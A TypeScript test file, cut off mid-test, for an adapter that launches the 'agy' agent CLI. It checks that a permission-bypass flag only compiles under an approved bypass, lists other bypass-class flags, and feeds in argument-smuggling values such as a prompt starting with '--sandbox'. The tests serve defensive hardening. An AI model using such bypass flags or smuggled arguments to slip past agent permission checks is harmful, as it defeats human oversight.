/**
 * T4.32 (TDD §4.4): the Antigravity module, probe and compile matrix. SYNTHETIC: the executable path is a placeholder and
 * no `agy` binary is run; probe output is the shape the 2026-10-14 live check recorded (`1.3.4`).
 */
import { execFileSync } from "node:child_process";
import {
  chmodSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  realpathSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Client, InMemoryTransport } from "@modelcontextprotocol/client";
import { afterAll, describe, expect, it } from "vitest";
import { ArtifactStore } from "../../artifacts/index.js";
import { GIT_FINALIZE_COMMIT_EVENT, GitPublisher, publishRefFor } from "../../git/index.js";
import { createIdGenerator } from "../../ids/index.js";
import { createLedger, openLedger } from "../../ledger/index.js";
import { RunLifecycle } from "../../lifecycle/index.js";
import { buildEnvelope } from "../../mcp/envelope.js";
import { createSwitchboardServer } from "../../mcp/server.js";
import { resolveTrustProfile } from "../../policy/profiles.js";
import { usageObservationsFromEvents } from "../../usage/observations.js";
import { WorkspaceManager } from "../../workspace/index.js";
import { auditInvocation, bypassClassFlags } from "../audit.js";
import { type ConformanceCase, missingRequiredKinds, runConformanceCase, runConformanceSuite } from "../conformance.js";
import { privilegedProfile, scopeShapes } from "../fixtures/privileged.js";
import { REPLAY_SCRIPT, replayLauncher } from "../fixtures/replay.js";
import { PreflightCache } from "../preflight-cache.js";
import { providerEntry } from "../providers.js";
import { AdapterRegistry } from "../registry.js";
import { createProbeRunner, startAdapterRun } from "../run.js";
import { guardEvent } from "../tool-guard.js";
import type {
  CompileRequest,
  ExitInfo,
  FailureEvidence,
  Invocation,
  NormalizedEvent,
  ParseState,
  ProbeOutput,
  ProbeRunner,
  ProviderId,
  ResolvedProfile,
  TrustProfile,
} from "../types.js";
import { isIneligible } from "../types.js";
import { ANTIGRAVITY_GIT_CAPABILITIES, ANTIGRAVITY_GIT_WRITE_CONTROL, AntigravityAdapter } from "./adapter.js";
import {
  ANTIGRAVITY_RUNNABLE_KINDS,
  antigravityConformanceCases,
  DEFAULT_SESSION_ID,
  fixturePath,
  PRIVILEGED_BYPASS_PROFILE,
  RESUMED_SESSION_ID,
  replayAdapter,
} from "./fixtures/cases.js";
import { AUTH_STATUS_ARGS, GIT_WRITE_CONTROL_DETAIL, NON_PRIVILEGED_UNSUPPORTED_DETAIL } from "./protocol.js";

const dirs: string[] = [];
const makeCwd = () => {
  const d = mkdtempSync(join(tmpdir(), "sb-antigravity-"));
  dirs.push(d);
  return d;
};
afterAll(() => {
  for (const d of dirs) rmSync(d, { recursive: true, force: true });
});

const EXE = "/opt/synthetic/agy";
const request = (over: Partial<CompileRequest> = {}): CompileRequest => ({
  runId: "run_01M4WBZSXSCWYKTKJN77A7MFJQ",
  objective: "--sandbox fix the failing test",
  constraints: [],
  workspace: { cwd: "/work/tree", writable: true },
  ...over,
});
const adapter = () => new AntigravityAdapter({ executable: EXE });
const PROFILES: TrustProfile[] = ["inspect-untrusted", "edit-untrusted", "test-sandboxed", "trusted-development"];
const profileOf = (name: TrustProfile): ResolvedProfile => resolveTrustProfile(name);
const BYPASS_SCOPE = {
  files: { access: "worktree" },
  shell: { mode: "broad" },
  network: { mode: "on" },
  repository_config: { mode: "enabled" },
  bypass: true,
} as const;
const compiled = (): Invocation => {
  const profile = privilegedProfile(BYPASS_SCOPE);
  const r = adapter().compile(request({ bypassApproved: true }), { ...profile, bypassApproved: true });
  if ("ineligible" in r) throw new Error(r.detail);
  return r;
};

describe("antigravity compile matrix (T4.32)", () => {
  it.each(PROFILES)("%s is Ineligible PROFILE_UNSUPPORTED, with and without a bypass approval", (name) => {
    for (const bypassApproved of [false, true]) {
      const r = adapter().compile(request({ bypassApproved }), { ...profileOf(name), bypassApproved });
      expect(r, name).toMatchObject({ ineligible: true, reason: "PROFILE_UNSUPPORTED" });
    }
  });

  it("privileged compiles only an approved bypass scope with worktree files, shell broad, network on, repo enabled", () => {
    let count = 0;
    for (const scope of scopeShapes()) {
      const profile = privilegedProfile(scope);
      for (const approved of [false, true]) {
        const label = JSON.stringify({ scope, approved });
        const r = adapter().compile(request({ bypassApproved: approved }), { ...profile, bypassApproved: approved });
        const expectOk =
          approved &&
          scope.bypass &&
          scope.files.access === "worktree" &&
          scope.shell.mode === "broad" &&
          scope.network.mode === "on" &&
          scope.repository_config.mode === "enabled";
        if (!expectOk) {
          expect(r, label).toMatchObject({ ineligible: true });
          // A privileged scope without bypass is refused for the settings-only toolPermission (TDD §4.4.2).
          if (!scope.bypass) expect(r, label).toMatchObject({ reason: "PROFILE_UNSUPPORTED" });
          continue;
        }
        count += 1;
        expect("ineligible" in r, label).toBe(false);
        if ("ineligible" in r) continue;
        expect(r.policyFlags, label).toEqual(["--dangerously-skip-permissions"]);
        expect(auditInvocation(r), label).toEqual(["--dangerously-skip-permissions"]);
        expect(auditInvocation(r, { profile, bypassApproved: false }), label).toEqual([
          "--dangerously-skip-permissions",
        ]);
        expect(auditInvocation(r, { profile, bypassApproved: true }), label).toEqual([]);
      }
    }
    expect(count).toBe(1);
  });

  it("a read-only workspace keeps the bypass cell Ineligible", () => {
    const profile = { ...privilegedProfile(BYPASS_SCOPE), bypassApproved: true };
    const r = adapter().compile(request({ bypassApproved: true, workspace: { cwd: "/w", writable: false } }), profile);
    expect(r).toMatchObject({ ineligible: true, reason: "CAPABILITY_MISSING" });
  });

  it("keeps the prompt in one `--prompt=` word and never emits a flag the TDD §4.4 rules exclude", () => {
    const r = compiled();
    expect(r.argv).toEqual([
      EXE,
      "--prompt=--sandbox fix the failing test",
      "--output-format",
      "stream-json",
      "--dangerously-skip-permissions",
    ]);
    const never = [
      "-p",
      "--sandbox",
      "--mode",
      "--model",
      "--effort",
      "--agent",
      "-c",
      "--continue",
      "--print-timeout",
      "--remote-control",
      "--gemini_dir",
      "--add-dir",
      "--project",
      "--new-project",
      "--input-format",
    ];
    for (const a of r.argv.slice(1)) expect(never.includes(a), a).toBe(false);
    expect(r.env).toEqual({ AGY_CLI_DISABLE_AUTO_UPDATE: "true" });
    expect(r.envAllowlist).toEqual(["PATH", "HOME"]);
    for (const name of ["GEMINI_API_KEY", "GOOGLE_API_KEY", "GOOGLE_GEMINI_BASE_URL", "GOOGLE_CLOUD_PROJECT"]) {
      expect(r.envAllowlist).not.toContain(name);
    }
    expect(r.stdin).toEqual({ kind: "none" });
    expect(r.transport).toBe("subprocess-jsonl");
    expect(r.outputFormat).toBe("jsonl");
  });

  it("an option-like model, an unapproved bypass and a missing binary are Ineligible with a reason", () => {
    const profile = privilegedProfile(BYPASS_SCOPE);
    const approved = { ...profile, bypassApproved: true };
    // ADR-0077: a plain model id compiles to `--model <id>`; an option-like one is refused.
    expect(adapter().compile(request({ model: "x", bypassApproved: true }), approved)).toMatchObject({
      policyFlags: ["--dangerously-skip-permissions", "--model", "x"],
    });
    expect(adapter().compile(request({ model: "-x", bypassApproved: true }), approved)).toMatchObject({
      reason: "CAPABILITY_MISSING",
    });
    expect(adapter().compile(request(), profile)).toMatchObject({ reason: "PROFILE_UNSUPPORTED" });
    const none = new AntigravityAdapter({ pathEnv: "/nonexistent" });
    expect(none.compile(request({ bypassApproved: true }), approved)).toMatchObject({
      reason: "CAPABILITY_MISSING",
      detail: expect.stringContaining("agy not found on PATH"),
    });
  });
});

describe("antigravity bypass-class declarations (ADR-0035, ADR-0045)", () => {
  const DECLARED = [
    "-dangerously-skip-permissions",
    "--remote-control",
    "-remote-control",
    "--gemini_dir",
    "-gemini_dir",
    "--add-dir",
    "-add-dir",
  ];

  it("are active now that the entry has an adapter", () => {
    for (const f of [...DECLARED, "--dangerously-skip-permissions"]) expect(bypassClassFlags()).toContain(f);
  });

  it("each spelling, bare or with a value, is refused outside the approved bypass case and admitted inside it", () => {
    const base = compiled();
    const scoped = privilegedProfile(BYPASS_SCOPE);
    for (const word of [...DECLARED, "-dangerously-skip-permissions=true", "-gemini_dir=/tmp/x"]) {
      const inv = { ...base, argv: [...base.argv, word] };
      const hits = auditInvocation(inv).filter((h) => h !== "--dangerously-skip-permissions");
      expect(hits, word).toHaveLength(1);
      expect(auditInvocation(inv, { profile: profileOf("trusted-development"), bypassApproved: true }), word).toContain(
        hits[0],
      );
      expect(auditInvocation(inv, { profile: scoped, bypassApproved: true }), word).toEqual([]);
    }
  });
});

describe("antigravity probe (T4.32)", () => {
  const runner =
    (table: Record<string, Partial<ProbeOutput>>): ProbeRunner =>
    async (argv) => {
      const key = argv.slice(1).join(" ");
      const hit = table[key] ?? { exitCode: 2 };
      return {
        stdout: hit.stdout ?? "",
        stderr: hit.stderr ?? "",
        exitCode: hit.exitCode ?? 0,
        timedOut: hit.timedOut ?? false,
      } as ProbeOutput;
    };
  const HELP =
    "Usage of agy:\n  -c, --continue\n  --conversation string\n  --dangerously-skip-permissions\n" +
    "  --output-format string\n  -p, --print, --prompt string\n  --sandbox\n";
  const HELP_1_4 = HELP.replace("  --output-format string\n", "");

  it("passes the five steps on 1.3.4-style help where --help lists --output-format", async () => {
    let checkedOutputFormat = false;
    const r = await adapter().probe(async (argv) => {
      const key = argv.slice(1).join(" ");
      if (key === "--version") return { stdout: "1.3.4\n", stderr: "", exitCode: 0, timedOut: false };
      if (key === "--help") return { stdout: HELP, stderr: "", exitCode: 0, timedOut: false };
      if (key === "--output-format json --help") {
        checkedOutputFormat = true;
        return { stdout: HELP, stderr: "", exitCode: 0, timedOut: false };
      }
      return { stdout: "", stderr: "", exitCode: 2, timedOut: false };
    });
    expect(r.binaryVersion).toBe("1.3.4");
    expect(r.steps.map((s) => [s.step, s.ok])).toEqual([
      ["binary", true],
      ["version", true],
      ["command", true],
      ["output_format", true],
      ["flags", true],
    ]);
    expect(checkedOutputFormat).toBe(false);
  });

  it("passes on 1.4-style help where --help omits --output-format but CLI accepts the flag", async () => {
    let checkedOutputFormat = false;
    const r = await adapter().probe(async (argv) => {
      const key = argv.slice(1).join(" ");
      if (key === "--version") return { stdout: "1.4.0\n", stderr: "", exitCode: 0, timedOut: false };
      if (key === "--help") return { stdout: HELP_1_4, stderr: "", exitCode: 0, timedOut: false };
      if (key === "--output-format json --help") {
        checkedOutputFormat = true;
        return { stdout: HELP_1_4, stderr: "", exitCode: 0, timedOut: false };
      }
      return { stdout: "", stderr: "", exitCode: 2, timedOut: false };
    });
    expect(r.binaryVersion).toBe("1.4.0");
    expect(checkedOutputFormat).toBe(true);
    expect(r.steps.map((s) => [s.step, s.ok])).toEqual([
      ["binary", true],
      ["version", true],
      ["command", true],
      ["output_format", true],
      ["flags", true],
    ]);
  });

  it("fails with today's message when --help omits --output-format and CLI rejects the flag", async () => {
    const r = await adapter().probe(
      runner({
        "--version": { stdout: "1.4.0\n", exitCode: 0 },
        "--help": { stdout: HELP_1_4, exitCode: 0 },
        "--output-format json --help": {
          stdout: "",
          stderr: "flags provided but not defined: -output-format\n",
          exitCode: 2,
        },
      }),
    );
    expect(r.steps.find((s) => s.step === "output_format")).toEqual({
      step: "output_format",
      ok: false,
      detail: "--output-format",
    });
    expect(r.steps.find((s) => s.step === "flags")).toEqual({
      step: "flags",
      ok: false,
      detail: "missing --output-format",
    });
  });

  it("names a missing flag, an unparseable version and a missing binary", async () => {
    const noConversation = await adapter().probe(
      runner({
        "--version": { stdout: "1.3.4\n", exitCode: 0 },
        "--help": { stdout: HELP.replace("--conversation", "--talk"), exitCode: 0 },
      }),
    );
    expect(noConversation.steps.find((s) => s.step === "flags")).toMatchObject({
      ok: false,
      detail: "missing --conversation",
    });
    const noVersion = await adapter().probe(runner({ "--version": { stdout: "agy\n", exitCode: 0 } }));
    expect(noVersion.binaryVersion).toBeNull();
    const missing = await new AntigravityAdapter({ pathEnv: "/nonexistent" }).probe(runner({}));
    expect(missing.steps).toEqual([{ step: "binary", ok: false, detail: "agy not found on PATH" }]);
  });

  describe("fake binary probe assertions (T4.32)", () => {
    function makeFakeAgy(behavior: "1.3.4" | "1.4-accepted" | "1.4-rejected" | "1.4-stderr"): {
      dir: string;
      exe: string;
      logFile: string;
      cleanup: () => void;
    } {
      const dir = realpathSync(mkdtempSync(join(tmpdir(), "switchboard-fake-agy-")));
      const exe = join(dir, "agy");
      const logFile = join(dir, "calls.log");
      const script = `#!/bin/sh
for arg in "$@"; do
  case "$arg" in
    -p|--prompt|--print|-p=*|--prompt=*|--print=*)
      echo "MODEL CALL FORBIDDEN: $arg" >&2
      exit 99
      ;;
  esac
done
echo "$@" >> "${logFile}"

if [ "$1" = "--version" ]; then
  echo "1.4.0"
  exit 0
fi

if [ "$1" = "--help" ]; then
  if [ "${behavior}" = "1.3.4" ]; then
    printf "Usage of agy:\\n  --conversation string\\n  --dangerously-skip-permissions\\n  --output-format string\\n  --prompt string\\n"
  elif [ "${behavior}" = "1.4-stderr" ]; then
    printf "Usage of agy:\\n  --conversation string\\n  --dangerously-skip-permissions\\n  --prompt string\\n" >&2
  else
    printf "Usage of agy:\\n  --conversation string\\n  --dangerously-skip-permissions\\n  --prompt string\\n"
  fi
  exit 0
fi

if [ "$1" = "--output-format" ] && [ "$2" = "json" ] && [ "$3" = "--help" ]; then
  if [ "${behavior}" = "1.4-rejected" ]; then
    echo "flags provided but not defined: -output-format" >&2
    exit 2
  else
    printf "Usage of agy:\\n  --conversation string\\n  --dangerously-skip-permissions\\n  --prompt string\\n"
    exit 0
  fi
fi

exit 1
`;
      writeFileSync(exe, script);
      chmodSync(exe, 0o755);
      return { dir, exe, logFile, cleanup: () => rmSync(dir, { recursive: true, force: true }) };
    }

    it("1.3.4-style fake binary (flag listed in help) passes and never spawns a model call", async () => {
      const fake = makeFakeAgy("1.3.4");
      try {
        const adp = new AntigravityAdapter({ executable: fake.exe });
        const res = await adp.probe(createProbeRunner(["PATH", "HOME"]));
        expect(res.steps.every((s) => s.ok)).toBe(true);
        const calls = readFileSync(fake.logFile, "utf8").trim().split("\n");
        expect(calls).toEqual(["--version", "--help"]);
      } finally {
        fake.cleanup();
      }
    });

    it("1.4-style fake binary (flag not in help, flag accepted) passes and never spawns a model call", async () => {
      const fake = makeFakeAgy("1.4-accepted");
      try {
        const adp = new AntigravityAdapter({ executable: fake.exe });
        const res = await adp.probe(createProbeRunner(["PATH", "HOME"]));
        expect(res.steps.every((s) => s.ok)).toBe(true);
        const calls = readFileSync(fake.logFile, "utf8").trim().split("\n");
        expect(calls).toEqual(["--version", "--help", "--output-format json --help"]);
      } finally {
        fake.cleanup();
      }
    });

    it("1.4-style fake binary with help on stderr passes and never spawns a model call", async () => {
      const fake = makeFakeAgy("1.4-stderr");
      try {
        const adp = new AntigravityAdapter({ executable: fake.exe });
        const res = await adp.probe(createProbeRunner(["PATH", "HOME"]));
        expect(res.steps.every((s) => s.ok)).toBe(true);
        const calls = readFileSync(fake.logFile, "utf8").trim().split("\n");
        expect(calls).toEqual(["--version", "--help", "--output-format json --help"]);
      } finally {
        fake.cleanup();
      }
    });

    it("1.4-style fake binary that rejects flag fails with today's message and never spawns a model call", async () => {
      const fake = makeFakeAgy("1.4-rejected");
      try {
        const adp = new AntigravityAdapter({ executable: fake.exe });
        const res = await adp.probe(createProbeRunner(["PATH", "HOME"]));
        expect(res.steps.find((s) => s.step === "output_format")).toEqual({
          step: "output_format",
          ok: false,
          detail: "--output-format",
        });
        expect(res.steps.find((s) => s.step === "flags")).toEqual({
          step: "flags",
          ok: false,
          detail: "missing --output-format",
        });
        const calls = readFileSync(fake.logFile, "utf8").trim().split("\n");
        expect(calls).toEqual(["--version", "--help", "--output-format json --help"]);
      } finally {
        fake.cleanup();
      }
    });
  });

  it("reads no Antigravity credential, settings or state file (source inspection)", () => {
    for (const f of ["adapter.ts", "protocol.ts"]) {
      const src = readFileSync(new URL(`./${f}`, import.meta.url), "utf8");
      expect(src, f).not.toMatch(/from "node:fs"|readFile|antigravity-oauth-token|settings\.json"/);
    }
  });
});

describe("antigravity auth preflight (T4.34; SYNTHETIC outputs in the shapes of the 2026-10-14 live check C3b, C3c)", () => {
  const out =
    (stdout: string, exitCode: number | null = 0, extra: Partial<ProbeOutput> = {}): ProbeRunner =>
    async () => ({ stdout, stderr: "", exitCode, timedOut: false, ...extra });
  const MODELS = "m-flash\tModel Flash\nm-pro\tModel Pro\n";
  const SIGN_IN = "Error: Please sign in to view available models. Launch the CLI without arguments to sign in.\n";

  it("runs only `models` with a short timeout; model lines at exit 0 are OK", async () => {
    const seen: Array<{ argv: readonly string[]; timeoutMs?: number }> = [];
    const r = await adapter().authPreflight(async (argv, opts) => {
      seen.push({ argv, ...(opts?.timeoutMs ? { timeoutMs: opts.timeoutMs } : {}) });
      return { stdout: MODELS, stderr: "Fetching available models...\n", exitCode: 0, timedOut: false };
    });
    expect(r).toEqual({ state: "OK" });
    expect(seen).toHaveLength(1);
    expect(seen[0]?.argv).toEqual([EXE, "models"]);
    expect(seen[0]?.timeoutMs).toBeLessThanOrEqual(10_000);
  });

  it("the sign-in error at exit 1 is AUTH_REQUIRED naming the native login", async () => {
    expect(await adapter().authPreflight(out("", 1, { stderr: SIGN_IN }))).toEqual({
      state: "AUTH_REQUIRED",
      loginCommand: "agy",
    });
  });

  it("any other output, exit code, timeout or spawn failure is UNKNOWN and leaks no more than one stderr line", async () => {
    const cases: Array<[string, ProbeRunner]> = [
      ["empty stdout at exit 0", out("")],
      ["a non-model line at exit 0", out(`${MODELS}You are not signed in\n`)],
      ["a line with no tab", out("m-flash Model Flash\n")],
      ["model lines at a non-zero exit", out(MODELS, 1)],
      ["sign-in text at exit 0", out("", 0, { stderr: SIGN_IN })],
      ["sign-in text at exit 2", out("", 2, { stderr: SIGN_IN })],
      ["an unknown error at exit 1", out("", 1, { stderr: "Error: flags provided but not defined\n" })],
      ["a null exit code", out(MODELS, null)],
      ["timeout", out("", null, { timedOut: true })],
      ["spawn error", out("", null, { spawnError: "ENOENT" })],
    ];
    for (const [name, runner] of cases) {
      expect(await adapter().authPreflight(runner), name).toMatchObject({ state: "UNKNOWN" });
    }
    const r = await adapter().authPreflight(
      out(MODELS, 1, { stderr: `Error: odd\u0007 ${"x".repeat(200)}\nsecret: hunter2\n` }),
    );
    expect(r.state).toBe("UNKNOWN");
    if (r.state === "UNKNOWN") {
      expect(r.reason.length).toBeLessThan(200);
      expect(r.reason).not.toContain("hunter2");
      expect(r.reason).not.toContain("\u0007");
      expect(r.reason).not.toContain("Model Flash");
    }
  });

  it("is UNKNOWN when the binary is not on PATH, without running anything", async () => {
    let ran = false;
    const r = await new AntigravityAdapter({ pathEnv: "/nonexistent" }).authPreflight(async () => {
      ran = true;
      return { stdout: MODELS, stderr: "", exitCode: 0, timedOut: false };
    });
    expect(r).toMatchObject({ state: "UNKNOWN" });
    expect(ran).toBe(false);
  });

  it("the T3.21 preflight cache keeps an OK and re-runs `models` after AUTH_REQUIRED or UNKNOWN", async () => {
    const HELP =
      "Usage of agy:\n  --conversation string\n  --dangerously-skip-permissions\n" +
      "  --output-format string\n  -p, --print, --prompt string\n";
    let models: ProbeOutput = { stdout: MODELS, stderr: "", exitCode: 0, timedOut: false };
    let modelCalls = 0;
    const runner: ProbeRunner = async (argv) => {
      const key = argv.slice(1).join(" ");
      if (key === "--version") return { stdout: "1.3.4\n", stderr: "", exitCode: 0, timedOut: false };
      if (key === "--help") return { stdout: HELP, stderr: "", exitCode: 0, timedOut: false };
      modelCalls += 1;
      return models;
    };
    const identity = { path: EXE, mtimeMs: 1, size: 1, ino: 1 };
    const fresh = () => new PreflightCache({ ttlMs: 60_000, now: () => 0, identify: () => identity });
    const a = adapter();

    const ok = fresh();
    expect((await ok.probe(a, runner)).steps.every((s) => s.ok)).toBe(true);
    expect(await ok.authPreflight(a, runner)).toEqual({ state: "OK" });
    expect(await ok.authPreflight(a, runner)).toEqual({ state: "OK" });
    expect(modelCalls).toBe(1);

    for (const failing of [
      { stdout: "", stderr: SIGN_IN, exitCode: 1, timedOut: false },
      { stdout: "", stderr: "", exitCode: null, timedOut: true },
    ]) {
      models = failing;
      modelCalls = 0;
      const cache = fresh();
      await cache.probe(a, runner);
      expect((await cache.authPreflight(a, runner)).state).not.toBe("OK");
      expect((await cache.authPreflight(a, runner)).state).not.toBe("OK");
      expect(modelCalls).toBe(2);
    }
  });
});

describe("antigravity registry entry and manifest gate (T4.32)", () => {
  it("is in the provider table with an adapter and declares resumeCwd like the adapter", () => {
    const entry = providerEntry("antigravity");
    expect(entry?.create).toBeDefined();
    expect(entry?.resumeCwd).toBe(adapter().resumeCwd);
    expect(entry?.create?.({}).id).toBe("antigravity");
  });

  it("fails the version gate for any version until `adapters validate` passes one (ADR-0009)", () => {
    const registry = new AdapterRegistry();
    for (const v of ["1.3.4", "1.3.1", "0.0.0", null]) {
      expect(registry.gate("antigravity", v).eligible, String(v)).toBe(false);
    }
  });
});

/**
 * T4.33: parser, result and failure classification. SYNTHETIC lines in the shapes the 2026-10-14 live check recorded
 * (rows C4, C7, C9, C10); ids, text and numbers are invented.
 */
describe("antigravity parser and result (T4.33)", () => {
  const CID = "0b6c2d1e-0000-4000-8000-00000000000a";
  const j = (o: Record<string, unknown>) => JSON.stringify(o);
  const INIT = j({
    event: "init",
    conversation_id: CID,
    init: { cwd: "/work/tree", tools: ["run_command"], permission_mode: "always-proceed", model: "synthetic-model" },
  });
  const STEP = (o: Record<string, unknown>) => j({ event: "step_update", conversation_id: CID, ...o });
  const USAGE = { input_tokens: 20, output_tokens: 3, thinking_tokens: 1, cache_read_tokens: 0, total_tokens: 24 };
  const RESULT = (over: Record<string, unknown> = {}) =>
    j({
      event: "result",
      result: {
        conversation_id: CID,
        status: "SUCCESS",
        response: "ok",
        duration_seconds: 3,
        num_turns: 1,
        usage: USAGE,
        ...over,
      },
    });
  const EXIT0: ExitInfo = { outcome: "exited", exitCode: 0, signal: null, expectedExitCodes: [0] };
  const parse = (lines: string[]) => {
    const a = adapter();
    const state: ParseState = { lines: 0, unknownEvents: 0 };
    const events: NormalizedEvent[] = lines.flatMap((l) => a.parseEvent(l, state));
    return { a, state, events };
  };

  it("success: conversation id and model from init, response as the summary, run-total usage provider_reported", () => {
    const { a, state, events } = parse([
      INIT,
      STEP({ step_index: 0, state: "DONE", step_type: "user_input" }),
      STEP({ step_index: 1, state: "ACTIVE", step_type: "agent_response", text_delta: "o", usage: USAGE }),
      STEP({ step_index: 1, state: "DONE", step_type: "agent_response", text_delta: "k" }),
      RESULT(),
    ]);
    expect(events).toEqual([
      { kind: "session_bound", nativeSessionId: CID, model: "synthetic-model" },
      { kind: "usage", source: "provider_reported", metrics: USAGE },
      { kind: "message", role: "assistant", text: "ok" },
      { kind: "result", ok: true },
    ]);
    expect(events.find((e) => e.kind === "session_bound")).not.toHaveProperty("backingProvider");
    expect(state).toMatchObject({ nativeSessionId: CID, unknownEvents: 0 });
    expect(a.extractResult(events, EXIT0)).toEqual({
      ok: true,
      nativeSessionId: CID,
      summary: "ok",
      unknownEventCount: 0,
    });
  });

  it("a soft-denied tool is PERMISSION_BLOCKED although status is SUCCESS and the exit is 0 (live check C7)", () => {
    const { a, events } = parse([
      INIT,
      STEP({
        step_index: 2,
        state: "ACTIVE",
        step_type: "tool",
        tool_name: "run_command",
        tool_info: { name: "run_command", parameters: { command: "echo hello" } },
      }),
      STEP({ step_index: 2, state: "DONE", step_type: "tool", tool_name: "run_command" }),
      RESULT({ response: "", denied_actions: [{ action: "command", display_name: "RunCommand" }] }),
    ]);
    expect(events.filter((e) => e.kind === "tool_call")).toEqual([
      { kind: "tool_call", tool: "shell", name: "run_command", command: "echo hello" },
    ]);
    expect(events).toContainEqual({ kind: "permission_denied", tool: "RunCommand" });
    expect(a.extractResult(events, EXIT0)).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
  });

  it("SUCCESS with no reported tokens (a print timeout, C10) and every other status fail", () => {
    const timeout = parse([INIT, RESULT({ response: "", usage: { ...USAGE, total_tokens: 0 } })]);
    expect(timeout.a.extractResult(timeout.events, EXIT0)).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE" });
    const noUsage = parse([INIT, RESULT({ usage: undefined })]);
    expect(noUsage.a.extractResult(noUsage.events, EXIT0)).toMatchObject({ ok: false });
    for (const status of ["ERROR", "CANCELED", "INTERRUPTED", "INVALID", "WAITING", "RUNNING", "NEW_STATUS"]) {
      const r = parse([INIT, RESULT({ status })]);
      expect(r.a.extractResult(r.events, EXIT0), status).toMatchObject({ ok: false });
    }
  });

  it("the envelope error maps an invalid model and a failed login; other errors are TOOL_FAILURE", () => {
    const cases: [string, string][] = [
      ["invalid model selection (--model x): Available models: a, b", "MODEL_UNAVAILABLE"],
      ["authentication failed or timed out", "AUTH_REQUIRED"],
      ["something else", "TOOL_FAILURE"],
    ];
    for (const [error, code] of cases) {
      const r = parse([j({ event: "result", result: { conversation_id: "", status: "ERROR", response: "", error } })]);
      expect(r.a.extractResult(r.events, { ...EXIT0, exitCode: 1 }), error).toMatchObject({
        ok: false,
        failureCode: code,
      });
    }
  });

  it("a non-zero exit, a missing result, a timeout and a cancel never succeed", () => {
    const { a, events } = parse([INIT, RESULT()]);
    expect(a.extractResult(events, { ...EXIT0, exitCode: 3 })).toMatchObject({
      ok: false,
      failureCode: "TOOL_FAILURE",
    });
    expect(a.extractResult(events, { ...EXIT0, outcome: "timeout", timeoutKind: "idle" })).toMatchObject({
      failureCode: "PROCESS_TIMEOUT",
    });
    expect(a.extractResult(events, { ...EXIT0, outcome: "cancelled" })).toMatchObject({ failureCode: "CANCELLED" });
    const cut = parse([INIT, STEP({ step_index: 1, state: "ACTIVE", step_type: "agent_response", text_delta: "x" })]);
    expect(cut.a.extractResult(cut.events, EXIT0)).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR" });
  });

  it("malformed and unknown lines are unknown events, counted, never a result; JSON framing errors emit nothing", () => {
    const { a, state, events } = parse([
      INIT,
      j({ event: "brand_new" }),
      j({ type: "init" }),
      j({ event: "init", conversation_id: CID }),
      j({ event: "step_update", state: "ACTIVE" }),
      j({ event: "result", result: {} }),
      "not json",
    ]);
    expect(events.filter((e) => e.kind === "unknown")).toHaveLength(5);
    expect(state.unknownEvents).toBe(5);
    expect(events.some((e) => e.kind === "result")).toBe(false);
    expect(a.extractResult(events, EXIT0)).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR" });
  });

  it("the conversation id comes only from structured fields; the first one stays bound and a change fails", () => {
    const other = "0b6c2d1e-0000-4000-8000-00000000000b";
    const { a, state, events } = parse([INIT, RESULT({ conversation_id: other, response: `id ${other}` })]);
    expect(state.nativeSessionId).toBe(CID);
    expect(events.filter((e) => e.kind === "session_bound")).toHaveLength(1);
    expect(a.extractResult(events, EXIT0)).toMatchObject({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      nativeSessionId: CID,
    });
    // A second `init` for another conversation is the same anomaly.
    const twice = parse([INIT, j({ event: "init", conversation_id: other, init: {} }), RESULT()]);
    expect(twice.a.extractResult(twice.events, EXIT0)).toMatchObject({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
    });
    // Repeating the same id (init then result, as recorded) is not an anomaly; an id only in text binds nothing.
    const same = parse([INIT, RESULT()]);
    expect(same.a.extractResult(same.events, EXIT0)).toMatchObject({ ok: true });
    const textOnly = parse([RESULT({ conversation_id: "", response: `conversation_id ${other}` })]);
    expect(textOnly.state.nativeSessionId).toBeUndefined();
  });
});

/**
 * T4.33 hardening toward the T4.23 Done-when (denied tools, malformed lines, resume). SYNTHETIC: shapes the live check
 * did not record are invented to pin a fail-closed reading, never to claim the CLI emits them.
 */
describe("antigravity parser hardening (T4.33, synthetic shapes)", () => {
  const CID = "0b6c2d1e-0000-4000-8000-00000000000c";
  const j = (o: Record<string, unknown>) => JSON.stringify(o);
  const INIT = j({
    event: "init",
    conversation_id: CID,
    init: { cwd: "/work/tree", permission_mode: "always-proceed" },
  });
  const USAGE = { input_tokens: 20, output_tokens: 3, thinking_tokens: 1, cache_read_tokens: 0, total_tokens: 24 };
  const RESULT = (over: Record<string, unknown> = {}) =>
    j({ event: "result", result: { conversation_id: CID, status: "SUCCESS", response: "ok", usage: USAGE, ...over } });
  const TOOL = (index: number, state: string, info?: Record<string, unknown>) =>
    j({
      event: "step_update",
      conversation_id: CID,
      step_index: index,
      state,
      step_type: "tool",
      tool_name: "run_command",
      ...(info ? { tool_info: info } : {}),
    });
  const EXIT0: ExitInfo = { outcome: "exited", exitCode: 0, signal: null, expectedExitCodes: [0] };
  const parse = (lines: string[]) => {
    const a = adapter();
    const state: ParseState = { lines: 0, unknownEvents: 0 };
    const events: NormalizedEvent[] = lines.flatMap((l) => a.parseEvent(l, state));
    return { a, state, events, result: a.extractResult(events, EXIT0) };
  };

  it("several denied tools are each reported and the run is PERMISSION_BLOCKED", () => {
    const { events, result } = parse([
      INIT,
      RESULT({
        denied_actions: [
          { action: "command", display_name: "RunCommand" },
          { action: "write" },
          "not an object",
          { display_name: "x".repeat(200) },
        ],
      }),
    ]);
    expect(events.filter((e) => e.kind === "permission_denied")).toEqual([
      { kind: "permission_denied", tool: "RunCommand" },
      { kind: "permission_denied", tool: "write" },
      { kind: "permission_denied", tool: "unknown" },
      { kind: "permission_denied", tool: `${"x".repeat(64)}…` },
    ]);
    expect(result).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
  });

  it("a denied_actions value that is not an array is read as a denial, never ignored; empty and null are none", () => {
    for (const denied of [{ action: "command" }, "command", 1, true]) {
      const r = parse([INIT, RESULT({ denied_actions: denied })]);
      expect(r.result, JSON.stringify(denied)).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
    }
    for (const denied of [[], null]) {
